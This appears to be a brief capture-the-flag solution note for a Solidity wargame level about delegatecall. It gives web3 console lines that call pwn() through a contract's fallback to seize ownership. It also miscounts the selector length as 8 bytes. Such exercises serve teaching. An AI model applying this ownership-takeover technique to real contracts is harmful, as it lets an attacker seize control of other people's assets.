delegation

// send transaction to delegate contract

// _delegatecall_ method allows contract can dynamically load code from different address at runtime

NOTE: _delegatecall_ *can change state*

```javascript
await contract.owner.call() // => returns rightful owner
await contract.sendTransaction({data: web3.sha3("pwn()").slice(0,10)}) // pwn() is the method we want to call; sends, as msg.data, the first [8] bytes of the hashed invoked function
await contract.owner.call() // => should see contract owner change to attacker once tx mined
```
